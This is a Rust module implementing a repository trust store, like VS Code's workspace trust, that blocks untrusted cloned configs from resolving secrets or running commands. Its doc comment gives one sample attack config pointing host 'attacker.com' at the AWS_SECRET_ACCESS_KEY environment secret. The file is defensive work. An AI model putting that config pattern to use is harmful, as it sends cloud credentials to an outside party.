//! Repository trust, like VS Code's "workspace trust".
//!
//! The configuration of a cloned repository was written by someone else. If it could
//! resolve secrets without permission, a connection with `host = "attacker.com"` and
//! `password = { secret = "env:AWS_SECRET_ACCESS_KEY" }` would be enough to steal them. So,
//! until the user trusts the repository, its connections neither resolve secrets nor run
//! commands. Personal configuration does not need this: the user wrote it.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::error::ConfigError;

#[derive(Debug, Default, Serialize, Deserialize)]
struct TrustFile {
    #[serde(default)]
    trusted: BTreeSet<PathBuf>,
}

/// Repositories the user trusts. Stored in their configuration directory.
#[derive(Debug, Clone)]
pub struct TrustStore {
    path: PathBuf,
    trusted: BTreeSet<PathBuf>,
}

impl TrustStore {
    pub fn load(user_dir: &Path) -> Result<Self, ConfigError> {
        let path = user_dir.join("trusted-workspaces.toml");
        let trusted = if path.is_file() {
            crate::load::parse_file::<TrustFile>(&path)?.trusted
        } else {
            BTreeSet::new()
        };
        Ok(Self { path, trusted })
    }

    pub fn is_trusted(&self, root: &Path) -> bool {
        self.trusted.contains(&canonical(root))
    }

    pub fn trust(&mut self, root: &Path) -> Result<(), ConfigError> {
        self.trusted.insert(canonical(root));
        self.save()
    }

    pub fn revoke(&mut self, root: &Path) -> Result<(), ConfigError> {
        self.trusted.remove(&canonical(root));
        self.save()
    }

    fn save(&self) -> Result<(), ConfigError> {
        let file = TrustFile {
            trusted: self.trusted.clone(),
        };
        let content = toml::to_string_pretty(&file)
            .map_err(|e| ConfigError::new(&self.path, e.to_string()))?;
        if let Some(parent) = self.path.parent() {
            std::fs::create_dir_all(parent).map_err(|e| ConfigError::new(parent, e.to_string()))?;
        }
        std::fs::write(&self.path, content).map_err(|e| ConfigError::new(&self.path, e.to_string()))
    }
}

/// Canonical path, so that `C:\repo` and `c:/repo/./` are the same repository.
fn canonical(path: &Path) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
}
